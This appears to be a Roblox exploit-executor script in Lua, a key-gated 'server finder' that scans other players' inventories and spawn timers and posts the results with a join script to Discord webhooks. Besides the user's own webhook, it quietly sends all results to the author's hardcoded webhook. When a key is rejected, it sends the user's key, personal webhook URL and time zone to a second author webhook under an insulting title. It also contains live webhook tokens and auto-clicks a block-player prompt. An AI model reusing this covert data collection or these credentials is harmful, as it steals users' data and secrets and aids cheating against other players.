if game.PlaceId == 5208655184 or 5208655184 then

    local BBKeys = {
        "A3bZ6iL1oT8pV5qD7gW4rH2mK9nF6jX0yS1cU8v", -- ឵឵឵ ❖#9498
        "C7bK3tL2fW4oV6mY8jG9iR1nA2wH5qE3dX0zS7p",
        "E8aM5fS2xY1cD7gJ4bZ9iR3tK6nV0wH9qL1oX2v",
        "F4aR5sT9kH3pJ1wD7bL2vC8mQ0yX6iN3uE2gW9oZ1",
        "G2mB8cX4jT9nS1dP6iY5vK0hU3aO7wL8rE9qZ4gF2",
        "I0aK9tB7jD3fP6yS5xQ8rW2hE1vM3zN7oA4wL6gT9",
        "L3aJ6nR0zC9dY2gH4xQ7vS1tF8bU5wI9oK4jM2pV0",
        "M5nO7hL2wD1xP8iR6oJ9qK3zT0yA4bC7gV2jS1vF8",
        "Q9dA2xY5iN7lB6rK1sF0jH4gZ3wE9cM8oV6uP5tS2",
        "U5bM2rD8oF3vL7aE9hC4xQ0gZ1nW6sK8jY3tS7iP4",
    }

-- Function to check if the key is valid
local function isBBKey(script_key)
    for _, BBKey in ipairs(BBKeys) do
        if script_key == BBKey then
            return true
        end
    end
    return false
end


if isBBKey(script_key) then
pcall(function()
repeat wait() until game:IsLoaded() and #game.Workspace:GetChildren() > 1

local jobid = game.JobId
local crock = workspace.MonsterSpawns.Triggers.CastleRockSnake:FindFirstChild("LastSpawned")
crock = tostring(math.floor((os.time() - crock.Value) / 60)) .. " Minutes Ago"

local dsunken = workspace.MonsterSpawns.Triggers.evileye1:FindFirstChild("LastSpawned")
local tundra2 = workspace.MonsterSpawns.Triggers.MazeSnakes:FindFirstChild("LastSpawned")
tundra2 = tostring(math.floor((os.time() - tundra2.Value) / 60)) .. " Minutes Ago"
dsunken = tostring(math.floor((os.time() - dsunken.Value) / 60)) .. " Minutes Ago"

local url = "https://discord.com/api/webhooks/1143503263325507645/ivhINkVr2Hz8VOdfHNGjg9Jy7SyPfEzOT1lt0kU77jd-PeYrgDSIObrejBp7qZRZsuyp"

current_date_time = os.date("%Y/%m/%d %H:%M:%S")
date_with_timezone = "Time Zone: " .. player_TimeZone .. "\nTime: " .. current_date_time

local playerCount = #game.Players:GetPlayers()
local ultraCount = 0

local dsageCount = 0
local oniCount = 0

local illuSuperCount = 0
local illuUltraCount = 0
local druidCount = 0
local necroCount = 0

local wispererCount = 0
local bardCount = 0
local shinobiCount = 0
local facelessCount = 0

local dickslayerCount = 0
local deepknightCount = 0

local sigilCount = 0
local darksigilCount = 0
local lapiCount = 0
local roninCount = 0
local abyssCount = 0
local vanguardCount = 0

--                                       ## Dragon Sage ##
local function checkfordsage(player)
    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Lightning Dash")
        if item then
            dsageCount = dsageCount + 1
            ultraCount = ultraCount + 1
            return true
        end
    end

    return false
end

--                                       ## Oni ##
local function checkforoni(player)

    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Misogi")
        if item then
            oniCount = oniCount + 1
            ultraCount = ultraCount + 1
            return true
        end
    end

    return false
end
--                                       ## Super Illusionist ##
local function checkforsuperillu(player)
    local character = player.Character
    local hasObserve = false

    if character then
        local tool = character:FindFirstChild("Observe")
        if tool then
            hasObserve = true
        end
    end

    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Observe")
        if item then
            hasObserve = true
        end
    end

    if hasObserve then
        illuSuperCount = illuSuperCount + 1
        return true
    end

    return false
end

--                                       ## Ultra Illusionist ##
local function checkforultraillu(player)
    local character = player.Character
    local hasGlobus = false

    if character then
        local tool = character:FindFirstChild("Globus")
        if tool then
            hasGlobus = true
        end
    end

    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Globus")
        if item then
            hasGlobus = true
        end
    end

    if hasGlobus then
        illuSuperCount = illuSuperCount - 1
        illuUltraCount = illuUltraCount + 1
        ultraCount = ultraCount + 1
        return true
    end

    return false
end
--                                       ## Druid ##
local function checkfordruid(player)
    local character = player.Character
    local hasPerflora = false

    if character then
        local tool = character:FindFirstChild("Perflora")
        if tool then
            hasPerflora = true
        end
    end

    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Perflora")
        if item then
            hasPerflora = true
        end
    end

    if hasPerflora then
        druidCount = druidCount + 1
        ultraCount = ultraCount + 1
        return true
    end

    return false
end

--                                       ## Necro ##
local function checkfornecro(player)
    local character = player.Character
    local hasSecare = false

    if character then
        local tool = character:FindFirstChild("Secare")
        if tool then
            hasSecare = true
        end
    end

    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Secare")
        if item then
            hasSecare = true
        end
    end

    if hasSecare then
        necroCount = necroCount + 1
        ultraCount = ultraCount + 1
        return true
    end

    return false
end

--                                      ## Wisperer ##    
local function checkforwisperer(player)
    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Acrobat")
        if item then
            wispererCount = wispererCount + 1
            ultraCount = ultraCount + 1
            return true
        end
    end

    return false
end

--                                       ## Bard ##
local function checkforbard(player)
    local character = player.Character
    local hasJoyousDance = false

    if character then
        local tool = character:FindFirstChild("Joyous Dance")
        if tool then
            hasJoyousDance = true
        end
    end

    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Joyous Dance")
        if item then
            hasJoyousDance = true
        end
    end

    if hasJoyousDance then
        bardCount = bardCount + 1
        ultraCount = ultraCount + 1
        return true
    end

    return false
end
--                                      ## Shinobi ##    
local function checkforshinobi(player)
    local character = player.Character
    local hasGrapple = false

    if character then
        local tool = character:FindFirstChild("Grapple")
        if tool then
            hasGrapple = true
        end
    end

    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Grapple")
        if item then
            hasGrapple = true
        end
    end

    if hasGrapple then
        shinobiCount = shinobiCount + 1
        ultraCount = ultraCount + 1
        return true
    end

    return false
end

--                                       ## Faceless ##
local function checkforfaceless(player)
    local character = player.Character
    local hasFan = false

    if character then
        local tool = character:FindFirstChild("ShadowDash")
        if tool then
            hasFan = true
        end
    end

    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("ShadowDash")
        if item then
            hasFan = true
        end
    end

    if hasFan then
       facelessCount = facelessCount + 1
       ultraCount = ultraCount + 1
        return true
    end

    return false
end

--                                       ## Dragon Slayer ##
local function checkfordslayer(player)
    local character = player.Character
    local hasAwakening = false

    if character then
        local tool = character:FindFirstChild("Dragon Awakening")
        if tool then
            hasAwakening = true
        end
    end

    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Dragon Awakening")
        if item then
            hasAwakening = true
        end
    end

    if hasAwakening then
       dickslayerCount = dickslayerCount + 1
       ultraCount = ultraCount + 1
        return true
    end

    return false
end
--                                       ## DeepKnight ##
local function checkfordeepknight(player)
    local character = player.Character
    local hasChainPull = false

    if character then
        local tool = character:FindFirstChild("Chain Pull")
        if tool then
            hasChainPull = true
        end
    end

    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Chain Pull")
        if item then
            hasChainPull = true
        end
    end

    if hasChainPull then
        deepknightCount = deepknightCount + 1
        ultraCount = ultraCount + 1
        return true
    end

    return false
end

--                                       ## Sigil ##
local function checkforsigil(player)
    local character = player.Character
    local hasHyperBody = false

    if character then
        local tool = character:FindFirstChild("Hyper Body")
        if tool then
            hasHyperBody = true
        end
    end

    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Hyper Body")
        if item then
            hasHyperBody = true
        end
    end

    if hasHyperBody then
       sigilCount = sigilCount + 1
       ultraCount = ultraCount + 1
        return true
    end

    return false
end

--                                       ## Dark Sigil ##
local function checkfordarksigil(player)
    local character = player.Character
    local hasEruption = false

    if character then
        local tool = character:FindFirstChild("Dark Eruption")
        if tool then
            hasEruption = true
        end
    end

    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Dark Eruption")
        if item then
            hasEruption = true
        end
    end

    if hasEruption then
       darksigilCount = darksigilCount + 1
       ultraCount = ultraCount + 1
        return true
    end

    return false
end

--                                       ## Lapi ##
local function checkforlapi(player)
    local character = player.Character
    local hasHammer = false

    if character then
        local tool = character:FindFirstChild("Shardcaster")
        if tool then
            hasHammer = true
        end
    end

    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Shardcaster")
        if item then
            hasHammer = true
        end
    end

    if hasHammer then
       lapiCount = lapiCount + 1
       ultraCount = ultraCount + 1
        return true
    end

    return false
end

--                                       ## Ronin ##
local function checkforronin(player)
    local character = player.Character
    local hasKatana = false

    if character then
        local tool = character:FindFirstChild("Katana")
        if tool then
            hasKatana = true
        end
    end

    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Katana")
        if item then
            hasKatana = true
        end
    end

    if hasKatana then
       roninCount = roninCount + 1
       ultraCount = ultraCount + 1
        return true
    end

    return false
end

--                                       ## Abyss ##
local function checkforabyswalker(player)
    local character = player.Character
    local hasScream = false

    if character then
        local tool = character:FindFirstChild("Abyssal Scream")
        if tool then
            hasScream = true
        end
    end

    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Abyssal Scream")
        if item then
            hasScream = true
        end
    end

    if hasScream then
       abyssCount = abyssCount + 1
       ultraCount = ultraCount + 1
        return true
    end

    return false
end

--                                       ## Vanguard ##
local function checkforvanguard(player)
    local character = player.Character
    local hasPoncture = false

    if character then
        local tool = character:FindFirstChild("Puncture")
        if tool then
            hasPoncture = true
        end
    end

    local backpack = player.Backpack
    if backpack then
        local item = backpack:FindFirstChild("Puncture")
        if item then
            hasPoncture = true
        end
    end

    if hasPoncture then
       vanguardCount = vanguardCount + 1
       ultraCount = ultraCount + 1
        return true
    end

    return false
end

local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkfordsage(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkforoni(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkforsuperillu(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkforultraillu(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkfordruid(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkfornecro(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkforwisperer(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkforbard(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkforfaceless(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkforshinobi(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkfordslayer(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkfordeepknight(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkforsigil(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkfordarksigil(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkforlapi(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkforronin(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkforabyswalker(player)
end
local players = game:GetService("Players"):GetPlayers()
for _, player in pairs(players) do
    checkforvanguard(player)
end


local joinscript = [[

local args = {
    [1] = "]] .. jobid .. [["
}
game:GetService("ReplicatedStorage").Requests:FindFirstChild("JoinPublicServer"):FireServer(table.unpack(args))

]]

local tundra2MinutesAgo = tonumber(tundra2:match("(%d+)"))
local crockMinutesAgo = tonumber(crock:match("(%d+)"))
local dsunkenMinutesAgo = tonumber(dsunken:match("(%d+)"))

if (tundra2MinutesAgo > 15 or crockMinutesAgo > 15 or dsunkenMinutesAgo > 15) then
    if ultraCount >= 10 then
     local data = {
          ["content"] = "Server Found - **Artefact Guaranteed**",
         ["embeds"] = {
              {
                 ["title"] = date_with_timezone,
                    ["description"] = "- **__Loots Spots__:** \n - Castle Rock: " .. crock .. "\n - Deep Sunken: " .. dsunken .. "\n - Lava Snake Pit: " .. tundra2 .. "\n\n- __**Players Informations:**__  Player Count: " .. playerCount .. " - Ultras: " .. ultraCount .. "\n - Dragon Sages: " .. dsageCount .. "\n - Onis: " .. oniCount .. "\n - __Illusionists:__ Super Illu -> " .. illuSuperCount .. " | Ultra Illu -> " .. illuUltraCount .. " \n - Druids: " .. druidCount .. "\n - Necromancers: " .. necroCount .. "\n - Wisperers: " .. wispererCount .. "\n - Bards: " .. bardCount .. "\n - Facelesss: " .. facelessCount .. "\n - Shinobis: " .. shinobiCount .. "\n - Dragon Slayers: " .. dickslayerCount .. "\n - DeepKnights: " .. deepknightCount .. "\n - Sigils/Solans: " .. sigilCount .. "\n - Dark Sigils: " .. darksigilCount .. "\n - Lapidarists: " .. lapiCount .. "\n - Ronins: " .. roninCount .. "\n - Abyss Walkers: " .. abyssCount .. "\n - Vanguards: " .. vanguardCount .. "\n\n\n Join Script:\n```lua\n" .. joinscript .. "\n```",
                    ["type"] = "rich",
                    ["color"] = tonumber("65280"),
             }
            }
      }
    
     local newdata = game:GetService("HttpService"):JSONEncode(data)
     local headers = {["content-type"] = "application/json"}

     request = http_request or request or HttpPost or syn.request
     local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
     request(abcdef)
    
    elseif ultraCount >= 6 then
     local data = {
         ["content"] = "Server Found - Artefact Not Guaranteed",
         ["embeds"] = {
             {
                  ["title"] = date_with_timezone,
                  ["description"] = "- **__Loots Spots__:** \n - Castle Rock: " .. crock .. "\n - Deep Sunken: " .. dsunken .. "\n - Lava Snake Pit: " .. tundra2 .. "\n\n- __**Players Informations:**__  Player Count: " .. playerCount .. " - Ultras: " .. ultraCount .. "\n - Dragon Sages: " .. dsageCount .. "\n - Onis: " .. oniCount .. "\n - __Illusionists:__ Super Illu -> " .. illuSuperCount .. " | Ultra Illu -> " .. illuUltraCount .. " \n - Druids: " .. druidCount .. "\n - Necromancers: " .. necroCount .. "\n - Wisperers: " .. wispererCount .. "\n - Bards: " .. bardCount .. "\n - Facelesss: " .. facelessCount .. "\n - Shinobis: " .. shinobiCount .. "\n - Dragon Slayers: " .. dickslayerCount .. "\n - DeepKnights: " .. deepknightCount .. "\n - Sigils/Solans: " .. sigilCount .. "\n - Dark Sigils: " .. darksigilCount .. "\n - Lapidarists: " .. lapiCount .. "\n - Ronins: " .. roninCount .. "\n - Abyss Walkers: " .. abyssCount .. "\n - Vanguards: " .. vanguardCount .. "\n\n\n Join Script:\n```lua\n" .. joinscript .. "\n```",
                  ["type"] = "rich",
                  ["color"] = tonumber("FFA500", 16),
              }
         }
     }

     local newdata = game:GetService("HttpService"):JSONEncode(data)
     local headers = {["content-type"] = "application/json"}

     request = http_request or request or HttpPost or syn.request
     local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
     request(abcdef)

    else
        local data = {
            ["content"] = "Server Found",
            ["embeds"] = {
                {
                    ["title"] = date_with_timezone,
                    ["description"] = "- **__Loots Spots__:** \n - Castle Rock: " .. crock .. "\n - Deep Sunken: " .. dsunken .. "\n - Lava Snake Pit: " .. tundra2 .. "\n\n- __**Players Informations:**__  Player Count: " .. playerCount .. " - Ultras: " .. ultraCount .. "\n - Dragon Sages: " .. dsageCount .. "\n - Onis: " .. oniCount .. "\n - __Illusionists:__ Super Illu -> " .. illuSuperCount .. " | Ultra Illu -> " .. illuUltraCount .. " \n - Druids: " .. druidCount .. "\n - Necromancers: " .. necroCount .. "\n - Wisperers: " .. wispererCount .. "\n - Bards: " .. bardCount .. "\n - Facelesss: " .. facelessCount .. "\n - Shinobis: " .. shinobiCount .. "\n - Dragon Slayers: " .. dickslayerCount .. "\n - DeepKnights: " .. deepknightCount .. "\n - Sigils/Solans: " .. sigilCount .. "\n - Dark Sigils: " .. darksigilCount .. "\n - Lapidarists: " .. lapiCount .. "\n - Ronins: " .. roninCount .. "\n - Abyss Walkers: " .. abyssCount .. "\n - Vanguards: " .. vanguardCount .. "\n\n\n Join Script:\n```lua\n" .. joinscript .. "\n```",
                    ["type"] = "rich",
                    ["color"] = tonumber("000000", 16),
                }
            }
        }
    
        local newdata = game:GetService("HttpService"):JSONEncode(data)
        local headers = {["content-type"] = "application/json"}
    
        request = http_request or request or HttpPost or syn.request
        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
        request(abcdef)
    
    end

else
    local data = {
        ["content"] = "Server Found",
        ["embeds"] = {
            {
                ["title"] = date_with_timezone,
                ["description"] = "- **__Loots Spots__:** \n - Castle Rock: " .. crock .. "\n - Deep Sunken: " .. dsunken .. "\n - Lava Snake Pit: " .. tundra2 .. "\n\n- __**Players Informations:**__  Player Count: " .. playerCount .. " - Ultras: " .. ultraCount .. "\n - Dragon Sages: " .. dsageCount .. "\n - Onis: " .. oniCount .. "\n - __Illusionists:__ Super Illu -> " .. illuSuperCount .. " | Ultra Illu -> " .. illuUltraCount .. " \n - Druids: " .. druidCount .. "\n - Necromancers: " .. necroCount .. "\n - Wisperers: " .. wispererCount .. "\n - Bards: " .. bardCount .. "\n - Facelesss: " .. facelessCount .. "\n - Shinobis: " .. shinobiCount .. "\n - Dragon Slayers: " .. dickslayerCount .. "\n - DeepKnights: " .. deepknightCount .. "\n - Sigils/Solans: " .. sigilCount .. "\n - Dark Sigils: " .. darksigilCount .. "\n - Lapidarists: " .. lapiCount .. "\n - Ronins: " .. roninCount .. "\n - Abyss Walkers: " .. abyssCount .. "\n - Vanguards: " .. vanguardCount .. "\n\n\n Join Script:\n```lua\n" .. joinscript .. "\n```",
                ["type"] = "rich",
                ["color"] = tonumber("000000", 16),
            }
        }
    }

    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {["content-type"] = "application/json"}

    request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)

end

if url ~= Discord_WebHook then
    if (tundra2MinutesAgo > 15 or crockMinutesAgo > 15 or dsunkenMinutesAgo > 15) then
        if ultraCount >= 10 then
         local data2 = {
              ["content"] = "Server Found - **Artefact Guaranteed**",
             ["embeds"] = {
                  {
                     ["title"] = date_with_timezone,
                        ["description"] = "- **__Loots Spots__:** \n - Castle Rock: " .. crock .. "\n - Deep Sunken: " .. dsunken .. "\n - Lava Snake Pit: " .. tundra2 .. "\n\n- __**Players Informations:**__  Player Count: " .. playerCount .. " - Ultras: " .. ultraCount .. "\n - Dragon Sages: " .. dsageCount .. "\n - Onis: " .. oniCount .. "\n - __Illusionists:__ Super Illu -> " .. illuSuperCount .. " | Ultra Illu -> " .. illuUltraCount .. " \n - Druids: " .. druidCount .. "\n - Necromancers: " .. necroCount .. "\n - Wisperers: " .. wispererCount .. "\n - Bards: " .. bardCount .. "\n - Facelesss: " .. facelessCount .. "\n - Shinobis: " .. shinobiCount .. "\n - Dragon Slayers: " .. dickslayerCount .. "\n - DeepKnights: " .. deepknightCount .. "\n - Sigils/Solans: " .. sigilCount .. "\n - Dark Sigils: " .. darksigilCount .. "\n - Lapidarists: " .. lapiCount .. "\n - Ronins: " .. roninCount .. "\n - Abyss Walkers: " .. abyssCount .. "\n - Vanguards: " .. vanguardCount .. "\n\n\n Join Script:\n```lua\n" .. joinscript .. "\n```",
                        ["type"] = "rich",
                        ["color"] = tonumber("65280"),
                 }
                }
          }
        
         local newdata = game:GetService("HttpService"):JSONEncode(data2)
         local headers = {["content-type"] = "application/json"}
    
         request = http_request or request or HttpPost or syn.request
         local abcdef = {Url = Discord_WebHook, Body = newdata, Method = "POST", Headers = headers}
         request(abcdef)
        
        elseif ultraCount >= 6 then
         local data2 = {
             ["content"] = "Server Found - Artefact Not Guaranteed",
             ["embeds"] = {
                 {
                      ["title"] = date_with_timezone,
                      ["description"] = "- **__Loots Spots__:** \n - Castle Rock: " .. crock .. "\n - Deep Sunken: " .. dsunken .. "\n - Lava Snake Pit: " .. tundra2 .. "\n\n- __**Players Informations:**__  Player Count: " .. playerCount .. " - Ultras: " .. ultraCount .. "\n - Dragon Sages: " .. dsageCount .. "\n - Onis: " .. oniCount .. "\n - __Illusionists:__ Super Illu -> " .. illuSuperCount .. " | Ultra Illu -> " .. illuUltraCount .. " \n - Druids: " .. druidCount .. "\n - Necromancers: " .. necroCount .. "\n - Wisperers: " .. wispererCount .. "\n - Bards: " .. bardCount .. "\n - Facelesss: " .. facelessCount .. "\n - Shinobis: " .. shinobiCount .. "\n - Dragon Slayers: " .. dickslayerCount .. "\n - DeepKnights: " .. deepknightCount .. "\n - Sigils/Solans: " .. sigilCount .. "\n - Dark Sigils: " .. darksigilCount .. "\n - Lapidarists: " .. lapiCount .. "\n - Ronins: " .. roninCount .. "\n - Abyss Walkers: " .. abyssCount .. "\n - Vanguards: " .. vanguardCount .. "\n\n\n Join Script:\n```lua\n" .. joinscript .. "\n```",
                      ["type"] = "rich",
                      ["color"] = tonumber("FFA500", 16),
                  }
             }
         }
    
         local newdata = game:GetService("HttpService"):JSONEncode(data2)
         local headers = {["content-type"] = "application/json"}
    
         request = http_request or request or HttpPost or syn.request
         local abcdef = {Url = Discord_WebHook, Body = newdata, Method = "POST", Headers = headers}
         request(abcdef)
    
        else
            local data2 = {
                ["content"] = "Server Found",
                ["embeds"] = {
                    {
                        ["title"] = date_with_timezone,
                        ["description"] = "- **__Loots Spots__:** \n - Castle Rock: " .. crock .. "\n - Deep Sunken: " .. dsunken .. "\n - Lava Snake Pit: " .. tundra2 .. "\n\n- __**Players Informations:**__  Player Count: " .. playerCount .. " - Ultras: " .. ultraCount .. "\n - Dragon Sages: " .. dsageCount .. "\n - Onis: " .. oniCount .. "\n - __Illusionists:__ Super Illu -> " .. illuSuperCount .. " | Ultra Illu -> " .. illuUltraCount .. " \n - Druids: " .. druidCount .. "\n - Necromancers: " .. necroCount .. "\n - Wisperers: " .. wispererCount .. "\n - Bards: " .. bardCount .. "\n - Facelesss: " .. facelessCount .. "\n - Shinobis: " .. shinobiCount .. "\n - Dragon Slayers: " .. dickslayerCount .. "\n - DeepKnights: " .. deepknightCount .. "\n - Sigils/Solans: " .. sigilCount .. "\n - Dark Sigils: " .. darksigilCount .. "\n - Lapidarists: " .. lapiCount .. "\n - Ronins: " .. roninCount .. "\n - Abyss Walkers: " .. abyssCount .. "\n - Vanguards: " .. vanguardCount .. "\n\n\n Join Script:\n```lua\n" .. joinscript .. "\n```",
                        ["type"] = "rich",
                        ["color"] = tonumber("000000", 16),
                    }
                }
            }
        
            local newdata = game:GetService("HttpService"):JSONEncode(data2)
            local headers = {["content-type"] = "application/json"}
        
            request = http_request or request or HttpPost or syn.request
            local abcdef = {Url = Discord_WebHook, Body = newdata, Method = "POST", Headers = headers}
            request(abcdef)
        
        end
    
    else
        local data2 = {
            ["content"] = "Server Found",
            ["embeds"] = {
                {
                    ["title"] = date_with_timezone,
                    ["description"] = "- **LOYD BANNED** Player Count: " .. playerCount .. " - Ultras: " .. ultraCount .. "\n - Dragon Sages: " .. dsageCount .. "\n - Onis: " .. oniCount .. "\n - __Illusionists:__ Super Illu -> " .. illuSuperCount .. " | Ultra Illu -> " .. illuUltraCount .. " \n - Druids: " .. druidCount .. "\n - Necromancers: " .. necroCount .. "\n - Wisperers: " .. wispererCount .. "\n - Bards: " .. bardCount .. "\n - Facelesss: " .. facelessCount .. "\n - Shinobis: " .. shinobiCount .. "\n - Dragon Slayers: " .. dickslayerCount .. "\n - DeepKnights: " .. deepknightCount .. "\n - Sigils/Solans: " .. sigilCount .. "\n - Dark Sigils: " .. darksigilCount .. "\n - Lapidarists: " .. lapiCount .. "\n - Ronins: " .. roninCount .. "\n - Abyss Walkers: " .. abyssCount .. "\n - Vanguards: " .. vanguardCount .. "\n\n\n Join Script:\n```lua\n" .. joinscript .. "\n```",
                    ["type"] = "rich",
                    ["color"] = tonumber("000000", 16),
                }
            }
        }
    
        local newdata = game:GetService("HttpService"):JSONEncode(data2)
        local headers = {["content-type"] = "application/json"}
    
        request = http_request or request or HttpPost or syn.request
        local abcdef = {Url = Discord_WebHook, Body = newdata, Method = "POST", Headers = headers}
        request(abcdef)
    
    end
end

local function isBBKey(script_key)
    for _, BBKey in ipairs(BBKeys) do
        if script_key == BBKey then
            return true
        end
    end
    return false
end
game.Players.SAKyfKDFKSFk:Destroy()

	
wait(2)
game:GetService("StarterGui"):SetCore("PromptBlockPlayer", game.Players:GetChildren()[2])
wait(1)
local blockpos = game:GetService("CoreGui").RobloxGui.PromptDialog.ContainerFrame.ConfirmButton.AbsolutePosition
game:GetService("VirtualInputManager"):SendMouseButtonEvent(blockpos.X + 5, blockpos.Y + 40, 0, true, game, 0)
task.wait()
game:GetService("VirtualInputManager"):SendMouseButtonEvent(blockpos.X + 5, blockpos.Y + 40, 0, false, game, 0)

while task.wait(20) do --Ak dáš wait pod 15 tak ti to zacne vyhadzovať unexpecte behavior
    game:GetService("TeleportService"):Teleport(3016661674)
end
end)
else

    local url2 = "https://discord.com/api/webhooks/1156271760983998526/_FC1PdmA3Y_AQTLLZ02EkOYyZXk6O8gBELwYu7lH3kYynJHNaxQ6PII4iGgJoE-4UpBP"

    local gameName = game.PlaceId

    local data = {
        ["content"] = "",
        ["embeds"] = {
            {
                ["title"] = "Retard Found ",
                ["description"] = "  \n\n **Game:** \n```" .. gameName .."```\n **His Key:** ```" .. script_key .."```\n **His WebHook:** ```" .. Discord_WebHook .."```\n **His Time Zone:** ```" .. player_TimeZone .."```",
                ["type"] = "rich",
                ["color"] = tonumber("16737523"),
            }
        }
    }

    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {["content-type"] = "application/json"}

    request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = url2, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end
else

    local url2 = "https://discord.com/api/webhooks/1156271760983998526/_FC1PdmA3Y_AQTLLZ02EkOYyZXk6O8gBELwYu7lH3kYynJHNaxQ6PII4iGgJoE-4UpBP"

    local gameName = game.PlaceId

    local data = {
        ["content"] = "",
        ["embeds"] = {
            {
                ["title"] = "Retard Found ",
                ["description"] = "  \n\n **Game:** \n```" .. gameName .."```\n **His Key:** ```" .. script_key .."```\n **His WebHook:** ```" .. Discord_WebHook .."```\n **His Time Zone:** ```" .. player_TimeZone .."```",
                ["type"] = "rich",
                ["color"] = tonumber("16737523"),
            }
        }
    }
    game.Players.SAKyfKDFKSFk:Destroy()

    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {["content-type"] = "application/json"}

    request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = url2, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end
